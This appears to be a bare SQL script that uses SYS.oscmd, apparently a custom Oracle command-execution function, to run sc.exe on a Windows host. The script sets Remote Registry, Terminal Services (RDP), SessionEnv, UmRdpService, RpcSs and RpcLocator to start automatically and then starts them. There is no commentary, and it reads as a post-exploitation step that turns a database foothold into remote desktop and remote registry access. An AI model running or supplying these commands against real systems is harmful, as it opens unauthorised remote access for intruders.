SELECT SYS.oscmd ('C:\Windows\System32\sc.exe config remoteregistry start= auto') from dual;
SELECT SYS.oscmd ('C:\Windows\System32\sc.exe config TermService start= auto') from dual;

SELECT SYS.oscmd ('C:\Windows\System32\sc.exe config remoteregistry start= auto') from dual;

SELECT SYS.oscmd ('C:\Windows\System32\sc.exe config SessionEnv start= auto') from dual;

SELECT SYS.oscmd ('C:\Windows\System32\sc.exe config UmRdpService start= auto') from dual;

SELECT SYS.oscmd ('C:\Windows\System32\sc.exe config RpcSs start= auto') from dual;

SELECT SYS.oscmd ('C:\Windows\System32\sc.exe config RpcLocator start= auto') from dual;

commit;

SELECT SYS.oscmd ('C:\Windows\System32\sc.exe start TermService') from dual;
SELECT SYS.oscmd ('C:\Windows\System32\sc.exe start remoteregistry') from dual;
SELECT SYS.oscmd ('C:\Windows\System32\sc.exe start SessionEnv') from dual;
SELECT SYS.oscmd ('C:\Windows\System32\sc.exe start UmRdpService') from dual;
SELECT SYS.oscmd ('C:\Windows\System32\sc.exe start RpcSs') from dual;
SELECT SYS.oscmd ('C:\Windows\System32\sc.exe start RpcLocator') from dual;
commit;
